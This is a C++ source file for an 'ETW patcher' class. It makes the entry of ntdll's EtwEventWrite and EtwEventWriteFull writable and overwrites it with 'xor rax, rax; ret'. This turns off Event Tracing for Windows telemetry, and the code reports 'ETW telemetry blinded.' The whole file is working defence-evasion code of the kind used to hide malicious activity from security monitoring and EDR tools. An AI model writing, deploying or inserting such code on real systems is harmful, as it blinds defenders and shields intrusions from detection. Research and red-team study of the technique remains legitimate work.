#include "etw_patcher.h"

bool EtwPatcher::PatchFunction(const char* modName, const char* funcName) {
    HMODULE hMod = GetModuleHandleA(modName);
    if (!hMod) hMod = LoadLibraryA(modName);
    if (!hMod) { PrintErr("Module not found."); return false; }

    FARPROC addr = GetProcAddress(hMod, funcName);
    if (!addr) { PrintErr("Function not found."); return false; }

    uint8_t* fn = reinterpret_cast<uint8_t*>(addr);
    if (fn[0] == 0x48 && fn[1] == 0x31 && fn[2] == 0xC0 && fn[3] == 0xC3) {
        char buf[128];
        snprintf(buf, sizeof(buf), "%s!%s already patched", modName, funcName);
        PrintWarn(buf);
        return true;
    }

    memcpy(m_originalBytes, fn, 8);

    DWORD oldProt = 0;
    if (!VirtualProtect(fn, 8, PAGE_EXECUTE_READWRITE, &oldProt)) {
        PrintErr("VirtualProtect failed."); return false;
    }

    // xor rax, rax; ret
    fn[0] = 0x48; fn[1] = 0x31; fn[2] = 0xC0; fn[3] = 0xC3;

    VirtualProtect(fn, 8, oldProt, &oldProt);
    FlushInstructionCache(GetCurrentProcess(), fn, 8);

    char buf[128];
    snprintf(buf, sizeof(buf), "Patched %s!%s", modName, funcName);
    PrintOk(buf);
    return true;
}

bool EtwPatcher::PatchEtwEventWrite()     { return PatchFunction("ntdll.dll", "EtwEventWrite"); }
bool EtwPatcher::PatchEtwEventWriteFull()  { return PatchFunction("ntdll.dll", "EtwEventWriteFull"); }

bool EtwPatcher::PatchAll() {
    Color::Cyan(); std::cout << "\n  === ETW PATCHER ===\n"; Color::Reset();
    bool a = PatchEtwEventWrite();
    bool b = PatchEtwEventWriteFull();
    if (a && b) PrintOk("ETW telemetry blinded.");
    return a && b;
}

bool EtwPatcher::IsPatched(const char* modName, const char* funcName) const {
    HMODULE hMod = GetModuleHandleA(modName);
    if (!hMod) return false;
    FARPROC addr = GetProcAddress(hMod, funcName);
    if (!addr) return false;
    uint8_t* fn = reinterpret_cast<uint8_t*>(addr);
    return (fn[0] == 0x48 && fn[1] == 0x31 && fn[2] == 0xC0 && fn[3] == 0xC3);
}
